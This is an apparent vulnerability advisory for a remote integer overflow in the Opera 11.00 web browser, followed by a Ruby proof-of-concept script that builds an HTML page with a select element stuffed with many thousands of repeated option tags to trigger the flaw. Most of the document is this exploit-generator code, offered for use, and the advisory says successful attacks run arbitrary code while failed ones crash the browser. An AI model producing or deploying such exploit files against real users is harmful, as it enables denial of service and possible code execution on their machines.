Opera Web Browser is prone to a remote integer-overflow vulnerability.

Successful exploits will allow an attacker to run arbitrary code in the context of the user running the application. Failed attacks will cause denial-of-service conditions.

Opera 11.00 is vulnerable; other versions may also be affected.

print "[*]Creating the Exploit\n"
i = 0
buf = "<option>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</option>\n"

while i<0x4141
     buf += "<option>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</option>\n"
     i+=1
end

HTML =
"<html>\n"+
"<body>\n\n"+
"<select>\n\n"

HTML+=buf * 100
HTML += "\n\n\n\</select>\n\n"+
"</body>\n\n\n"+
"</html>\n\n\n\n\n"

f = File.open("Exploit_opera_11.00.html","w")
f.puts HTML
f.close
